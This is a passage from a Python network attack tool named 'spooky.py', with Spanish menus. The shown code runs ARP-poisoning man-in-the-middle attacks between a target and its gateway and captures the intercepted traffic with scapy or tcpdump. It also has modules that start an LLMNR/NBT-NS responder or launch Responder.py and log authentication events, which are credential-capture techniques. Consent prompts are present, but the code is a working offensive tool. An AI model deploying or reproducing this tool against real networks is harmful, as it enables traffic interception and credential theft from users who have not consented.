    for k in ("iface","target","gateway","pcap","timeout","interval","only_sniff","use_tcpdump","bpf_filter","enable_logging","log_auth_events","auth_logfile","logfile"):
        print(f"  {k:12s} = {opts[k] if k in opts else ''}")
    print("\nComandos:")
    print("  set iface <iface>        - establecer interfaz (ej: eth0)")
    print("  set target <ip>          - IP objetivo")
    print("  set gateway <ip>         - IP gateway")
    print("  set pcap <file>          - archivo pcap de salida")
    print("  set timeout <secs>       - tiempo de sniff (0 = espera Ctrl+C)")
    print("  set interval <secs>      - intervalo entre ARP poison")
    print("  set filter <BPF expr>    - BPF (ej: 'tcp port 80' o 'host 10.0.2.5')")
    print("  toggle only_sniff        - modo sólo sniff (no ARP poison)")
    print("  toggle use_tcpdump       - usar tcpdump en vez de scapy para capture")
    print("  toggle enable_logging    - activar/desactivar logging a archivo")
    print("  set logfile <file>       - archivo de log")
    print("  show                     - mostrar opciones actuales")
    print("  start                    - iniciar ataque MITM/sniffing)")
    print("  reset_macs               - limpiar MACs resueltas")
    print("  help                     - mostrar este menú")
    print("  module start llmnr       - iniciar LLMNR/NBT-NS responder simple")
    print("  module stop llmnr        - detener LLMNR/NBT-NS responder")
    print("  module run responder     - intentar ejecutar Responder.py si está disponible")
    print("  stats llmnr              - mostrar estadísticas del responder LLMNR")
    print("  exit                     - salir (sin ejecutar)\n")

def interactive_loop():
    print_menu()
    while True:
        try:
            cmd = input("spooky> ").strip()
        except EOFError:
            cmd = "exit"
        if not cmd:
            continue
        parts = cmd.split()
        if parts[0] in ("set",):
            if len(parts) < 3:
                print("Uso: set <opcion> <valor>")
                continue
            key = parts[1].lower()
            value = " ".join(parts[2:])
            if key in ("iface","target","gateway","pcap","bpf_filter","logfile"):
                opts[key] = value
            elif key in ("max_pcap_size_mb","max_pcap_files","require_consent_file"):
                # numeric or path
                if key in ("max_pcap_size_mb","max_pcap_files"):
                    try:
                        opts[key] = int(value)
                    except Exception:
                        print(f"{key} debe ser un entero")
                else:
                    opts[key] = value
            elif key == "timeout":
                try:
                    opts["timeout"] = int(value)
                except:
                    print("timeout debe ser entero.")
            elif key == "interval":
                try:
                    opts["interval"] = float(value)
                except:
                    print("interval debe ser float.")
            else:
                print("Opcion desconocida:", key)
        elif parts[0] == "toggle":
            if len(parts) < 2:
                print("toggle <option>")
                continue
            key = parts[1]
            if key in ("only_sniff","use_tcpdump","enable_logging","log_auth_events"):
                opts[key] = not opts.get(key, False)
            elif key == 'responder_supervise':
                opts['responder_supervise'] = not opts.get('responder_supervise', True)
            else:
                print("Opcion toggle desconocida.")
        elif parts[0] == "show":
            print("\nOpciones actuales:")
            for k in ("iface","target","gateway","pcap","timeout","interval","only_sniff","use_tcpdump","bpf_filter","enable_logging","logfile"):
                print(f"  {k:12s} = {opts[k] if k in opts else ''}")
            print("")
        elif parts[0] == "start":
            # minimal checks
            if not opts["iface"]:
                print("Debes establecer -- iface primero. (set iface <iface>)")
                continue
            if not opts["only_sniff"]:
                if not opts["target"] or not opts["gateway"]:
                    print("Si no estás en only_sniff debes establecer target y gateway.")
                    continue
            # consent gating
            try:
                check_consent_or_raise()
            except Exception as e:
                print(f"Consent requirement failed: {e}")
                continue
            # ask explicit confirmation
            confirm = input("Confirmas ejecutar con permiso? (si/no): ").strip().lower()
            if confirm not in ("si","s","yes","y"):
                print("Aborted by user.")
                continue
            return  # salir del loop y ejecutar
        elif parts[0] == "reset_macs":
            global target_mac, gateway_mac
            target_mac = None
            gateway_mac = None
            print("MACs reseteadas.")
        elif parts[0] == "help":
            print_menu()
        elif parts[0] == "module":
            if len(parts) < 3:
                print("Uso: module <start|stop|run> <name>")
                continue
            action = parts[1]
            name = parts[2]
            if action == "start" and name == "llmnr":
                if responder_thread is not None and responder_thread.is_alive():
                    print("LLMNR responder ya está en ejecución")
                    continue
                try:
                    start_llmnr_responder(opts.get("iface"))
                    print("LLMNR responder iniciado")
                except Exception as e:
                    print(f"Error iniciando llmnr: {e}")
            elif action == "stop" and name == "llmnr":
                stop_llmnr_responder()
                print("LLMNR responder detenido (si estaba activo)")
            elif action == "run" and name == "responder":
                try:
                    run_responder_external()
                except Exception as e:
                    print(f"Error lanzando Responder.py: {e}")
            elif action == "show" and name == "auth-log":
                # optional: support tail parameter: show auth-log [N]
                tail = 50
                if len(parts) >= 4:
                    try:
                        tail = int(parts[3])
                    except Exception:
                        pass
                show_auth_log(tail=tail)
            else:
                print("Módulo desconocido o acción inválida")
        elif parts[0] == "stats":
            if len(parts) < 2:
                print("Uso: stats <name>")
                continue
            if parts[1] == "llmnr":
                print("LLMNR stats:")
                for k, v in llmnr_stats.items():
                    print(f"  {k}: {v}")
            else:
                print("Stats desconocida")
        elif parts[0] in ("exit","quit"):
            log("Saliendo sin ejecutar.")
            sys.exit(0)
        else:
            print("Comando desconocido. Escribe 'help' para ver opciones.")

def parse_cli_args():
    """Parse CLI args and merge into opts. Returns (args, non_interactive)
    non_interactive is True when at least one meaningful option was passed.
    """
    parser = argparse.ArgumentParser(prog="spooky.py", add_help=False)
    parser.add_argument("--iface", help="interface to use")
    parser.add_argument("--target", help="target IP")
    parser.add_argument("--gateway", help="gateway IP")
    parser.add_argument("--pcap", help="pcap output file")
    parser.add_argument("--timeout", type=int, help="sniff timeout seconds")
    parser.add_argument("--interval", type=float, help="poison interval seconds")
    parser.add_argument("--only-sniff", action="store_true", help="only sniff, no poisoning")
    parser.add_argument("--use-tcpdump", action="store_true", help="use tcpdump for capture")
    parser.add_argument("--bpf", help="BPF filter expression for capture")
    parser.add_argument("--no-logging", action="store_true", help="disable logfile")
    parser.add_argument("--logfile", help="log file path")
    parser.add_argument("--max-pcap-size", type=int, help="rotate pcap when size (MB) reached")
    parser.add_argument("--max-pcap-files", type=int, help="number of rotated pcap files to keep")
    parser.add_argument("--require-consent-file", help="path to a consent token file required to run")
    parser.add_argument("--no-responder-supervise", action="store_true", help="do not supervise/restart external Responder")
    parser.add_argument("--responder-restart-limit", type=int, help="how many times to restart responder before giving up")
    parser.add_argument("--show-auth-log", nargs='?', const='50', help="print the auth-log (optionally provide tail lines)")
    parser.add_argument("--yes", "-y", action="store_true", help="assume yes for confirmations")
    parser.add_argument("--dry-run", action="store_true", help="validate settings but do not execute poisoning")
    parser.add_argument("--log-auth", action="store_true", help="log auth-event metadata to file")
    parser.add_argument("--auth-logfile", help="auth events logfile path")
    # allow -h from user
    parser.add_argument("-h", "--help", action="help", help="show this help message and exit")
    args, unknown = parser.parse_known_args()

    provided = any([args.iface, args.target, args.gateway, args.pcap, args.timeout is not None,
                    args.interval is not None, args.only_sniff, args.use_tcpdump, args.bpf,
                    args.logfile, args.no_logging, args.dry_run])

    if args.iface:
        opts["iface"] = args.iface
    if args.target:
        opts["target"] = args.target
    if args.gateway:
        opts["gateway"] = args.gateway
    if args.pcap:
        opts["pcap"] = args.pcap
    if args.timeout is not None:
        opts["timeout"] = args.timeout
    if args.interval is not None:
        opts["interval"] = args.interval
    if args.only_sniff:
        opts["only_sniff"] = True
    if args.use_tcpdump:
        opts["use_tcpdump"] = True
    if args.bpf:
        opts["bpf_filter"] = args.bpf
    if args.no_logging:
        opts["enable_logging"] = False
    if args.logfile:
        opts["logfile"] = args.logfile
    if args.log_auth:
        opts["log_auth_events"] = True
    if args.auth_logfile:
        opts["auth_logfile"] = args.auth_logfile
    if args.max_pcap_size is not None:
        opts["max_pcap_size_mb"] = args.max_pcap_size
    if args.max_pcap_files is not None:
        opts["max_pcap_files"] = args.max_pcap_files
    if args.require_consent_file:
        opts["require_consent_file"] = args.require_consent_file
    if args.no_responder_supervise:
        opts["responder_supervise"] = False
    if args.responder_restart_limit is not None:
        opts["responder_restart_limit"] = args.responder_restart_limit
    if args.show_auth_log:
        try:
            tail_n = int(args.show_auth_log)
        except Exception:
            tail_n = 50
        show_auth_log(tail=tail_n)
        # when using --show-auth-log we exit after showing
        sys.exit(0)

    return args, provided

# ------------------ Tcpdump helper ------------------
def start_tcpdump_capture(iface, pcap_file, bpf_filter=""):
    # Requires tcpdump installed and run as root
    if shutil.which("tcpdump") is None:
        raise RuntimeError("tcpdump no encontrado en PATH")
    # Build command safely splitting BPF expression
    cmd = ["tcpdump", "-i", iface, "-w", pcap_file]
    if bpf_filter:
        # shlex.split preserves quoted segments; extend cmd with filter tokens
        try:
            parts = shlex.split(bpf_filter)
        except Exception:
            parts = [bpf_filter]
        cmd.extend(parts)
    log(f"[*] Iniciando tcpdump: {' '.join(cmd)}")
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    opts["_tcpdump_proc"] = proc
    return proc

# ------------------ Main flow ------------------
def main():
    global poison_thread, stopped, target_mac, gateway_mac
    # Parse CLI args; if provided run non-interactively
    args, non_interactive = parse_cli_args()
    if non_interactive:
        # validate minimal params
        if not opts["iface"]:
            print("Error: --iface es obligatorio en modo no interactivo")
            sys.exit(1)
        if not opts["only_sniff"] and (not opts["target"] or not opts["gateway"]):
            print("Error: --target y --gateway son obligatorios si no usas --only-sniff")
            sys.exit(1)
        if args.dry_run:
            print("Dry-run: parámetros validados. No se ejecutará el poisoning.")
            print("Opciones:")
            for k in ("iface","target","gateway","pcap","timeout","interval","only_sniff","use_tcpdump","bpf_filter","enable_logging","logfile"):
                print(f"  {k:12s} = {opts.get(k)}")
            return
        if not args.yes:
            confirm = input("Confirmas ejecutar con permiso? (si/no): ").strip().lower()
            if confirm not in ("si","s","yes","y"):
                print("Aborted by user.")
                sys.exit(0)
    else:
        # interactive mode
        print("SP00KY — herramienta de Sniffing.")
        interactive_loop()

    # apply conf iface
    conf.iface = opts["iface"]
    # consent gating (if configured)
    try:
        check_consent_or_raise()
    except Exception as e:
        log(f"[!] Consent requirement failed: {e}")
        sys.exit(1)

    log("[*] Resolviendo MACs (si aplica)...")
    if not opts["only_sniff"]:
        target_mac = get_mac(opts["target"], opts["iface"])
        gateway_mac = get_mac(opts["gateway"], opts["iface"])
        if not target_mac or not gateway_mac:
            log("[!] No se pudieron resolver MACs. Abortando.")
            sys.exit(1)
        log(f"Target {opts['target']} -> {target_mac}")
        log(f"Gateway {opts['gateway']} -> {gateway_mac}")

    # Start tcpdump if selected
    if opts["use_tcpdump"]:
        # ensure pcap path's parent exists and rotate if needed
        ensure_pcap_parent(opts.get("pcap"))
        rotate_pcap_if_needed(opts.get("pcap"))
        try:
            start_tcpdump_capture(opts["iface"], opts["pcap"], opts["bpf_filter"])
            log("[*] tcpdump activo. Usa Ctrl+C para detener y guardar.")
        except Exception as e:
            log(f"[!] Error iniciando tcpdump: {e}")
            sys.exit(1)

    # Only sniff mode (without poisoning)
    if opts["only_sniff"]:
        log("[*] Modo solo sniffing.")
        stopped = False
        try:
            # Scapy sniff supports filter param for BPF
            sniff(iface=opts["iface"], prn=packet_handler, store=False, timeout=(opts["timeout"] if opts["timeout"]>0 else None), filter=opts["bpf_filter"] or None)
        except Exception as e:
            log(f"[!] Error en sniff (scapy): {e}")
        graceful_exit(None, None)

    # Start ARP poisoning thread
    log("[*] Iniciando ARP poisoning (MITM).")
    stopped = False
    poison_thread = threading.Thread(target=poison_loop, args=(opts["target"], target_mac, opts["gateway"], gateway_mac, opts["iface"], opts["interval"]), daemon=True)
    poison_thread.start()

    # Start sniffing (scapy) unless tcpdump is used
    if not opts["use_tcpdump"]:
        log(f"[*] Iniciando sniffing (scapy). Timeout = {opts['timeout']}s. Filtro BPF: '{opts['bpf_filter']}'")
        try:
            sniff(iface=opts["iface"], prn=packet_handler, store=False, timeout=(opts["timeout"] if opts["timeout"]>0 else None), filter=opts["bpf_filter"] or None)
        except Exception as e:
            log(f"[!] Error en sniff (scapy): {e}")
    else:
        # if tcpdump is in use, wait until timeout or Ctrl+C
        log(f"[*] tcpdump está capturando en background. Timeout = {opts['timeout']}s")
        if opts["timeout"] and opts["timeout"]>0:
            try:
                time.sleep(opts["timeout"])
            except KeyboardInterrupt:
                pass
        else:
            # wait until Ctrl+C
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass

    # Stop poisoning and cleanup
    stopped = True
    if poison_thread is not None:
        poison_thread.join(timeout=3)
    restore_arp(opts["target"], target_mac, opts["gateway"], gateway_mac, opts["iface"])

    # If tcpdump used, try to terminate it nicely
    if opts["use_tcpdump"] and opts.get("_tcpdump_proc"):
        proc = opts["_tcpdump_proc"]
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except Exception:
                proc.kill()
        log("[*] tcpdump detenido al finalizar.")

    # Save pcap if we captured with scapy
    if captured_packets:
        try:
            ensure_pcap_parent(opts.get("pcap"))
            rotate_pcap_if_needed(opts.get("pcap"))
            wrpcap(opts["pcap"], captured_packets)
            log(f"[*] Guardado {len(captured_packets)} paquetes (scapy) en {opts['pcap']}")
        except Exception as e:
            log(f"[!] Error guardando pcap (scapy): {e}")

    log("[*] Proceso finalizado. Revisa los archivos: pcap y logfile (si activado).")

if __name__ == "__main__":
    main()
